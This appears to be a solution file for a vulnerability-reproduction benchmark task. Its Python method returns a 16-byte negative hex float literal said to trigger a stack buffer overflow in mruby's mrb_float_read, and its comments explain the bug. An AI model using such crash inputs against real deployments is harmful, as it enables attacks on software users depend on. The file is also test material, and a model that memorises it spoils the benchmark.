import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Stack Buffer Overflow in mrb_float_read in mruby.
        # It is triggered by a malformed or specific negative hex floating point literal
        # where the parser incorrectly advances the pointer past the minus sign
        # and then engages a buggy manual hex parsing path.
        # Ground truth length is 16 bytes.
        # Constructing a negative hex float of exactly 16 bytes.
        return b"-0x1.000000000p0"